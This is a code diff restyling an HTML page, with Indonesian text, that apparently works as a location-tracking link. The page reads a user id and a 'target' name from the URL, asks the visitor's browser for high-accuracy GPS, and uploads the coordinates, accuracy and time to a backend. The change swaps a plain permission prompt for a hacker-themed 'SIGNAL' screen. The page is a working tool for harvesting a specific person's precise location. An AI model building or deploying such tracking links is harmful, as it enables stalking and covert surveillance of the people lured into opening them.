@@ -3,16 +3,106 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Memuat...</title>
+  <title>Loading...</title>
   <style>
-    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; text-align: center; }
-    .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0a0e14;
+      color: #00ff9d;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: 
+        linear-gradient(rgba(0,255,157,0.05) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,157,0.05) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+    }
+    .scanline {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(transparent 50%, rgba(0,255,157,0.03) 50%);
+      background-size: 100% 4px;
+      pointer-events: none;
+    }
+    .box {
+      background: rgba(10, 20, 30, 0.9);
+      border: 2px solid #00ff9d;
+      border-radius: 8px;
+      padding: 40px 25px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 
+        0 0 20px rgba(0,255,157,0.5),
+        0 0 40px rgba(0,255,157,0.2),
+        inset 0 0 20px rgba(0,255,157,0.05);
+      position: relative;
+      z-index: 2;
+    }
+    .box::before {
+      content: '◢ SIGNAL ◣';
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0a0e14;
+      padding: 0 10px;
+      color: #00ff9d;
+      font-size: 11px;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px #00ff9d;
+    }
+    .icon {
+      font-size: 50px;
+      margin-bottom: 15px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; text-shadow: 0 0 20px #00ff9d; }
+      50% { opacity: 0.4; text-shadow: 0 0 5px #00ff9d; }
+    }
+    h2 {
+      color: #00ff9d;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+      font-size: 16px;
+      text-shadow: 0 0 10px #00ff9d;
+    }
+    p {
+      color: #7dfcce;
+      font-size: 13px;
+      letter-spacing: 1px;
+      line-height: 1.5;
+    }
+    .dots::after {
+      content: '';
+      animation: dots 1.5s infinite;
+    }
+    @keyframes dots {
+      0% { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+    }
   </style>
 </head>
 <body>
+  <div class="scanline"></div>
   <div class="box">
-    <h2 id="msg">Meminta izin lokasi...</h2>
-    <p id="sub">Mohon klik "Allow" / "Izinkan"</p>
+    <div class="icon">📡</div>
+    <h2 id="msg">INITIALIZING SIGNAL<span class="dots"></span></h2>
+    <p id="sub">Menunggu izin lokasi...</p>
   </div>
 
 <script type="module">
@@ -37,9 +127,11 @@ const user = params.get('u');
 const target = params.get('t') || 'target';
 
 if (!user) {
-  document.getElementById('msg').innerText = 'Link tidak valid';
+  document.getElementById('msg').innerText = '[!] INVALID LINK';
+  document.getElementById('sub').innerText = 'Link tidak valid';
 } else if (!navigator.geolocation) {
-  document.getElementById('msg').innerText = 'Browser tidak mendukung GPS';
+  document.getElementById('msg').innerText = '[!] NO GPS';
+  document.getElementById('sub').innerText = 'Browser tidak mendukung';
 } else {
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -50,13 +142,13 @@ if (!user) {
         akurasi: pos.coords.accuracy,
         waktu: Date.now()
       }).then(() => {
-        document.getElementById('msg').innerText = '✅ Terima kasih';
-        document.getElementById('sub').innerText = 'Lokasi berhasil dikirim';
+        document.getElementById('msg').innerText = '[✓] SIGNAL SENT';
+        document.getElementById('sub').innerText = 'Terima kasih';
       });
     },
     err => {
-      document.getElementById('msg').innerText = '❌ Izin ditolak';
-      document.getElementById('sub').innerText = 'Lokasi tidak bisa diambil';
+      document.getElementById('msg').innerText = '[✗] ACCESS DENIED';
+      document.getElementById('sub').innerText = 'Izin lokasi ditolak';
     },
     { enableHighAccuracy: true, timeout: 10000 }
   );
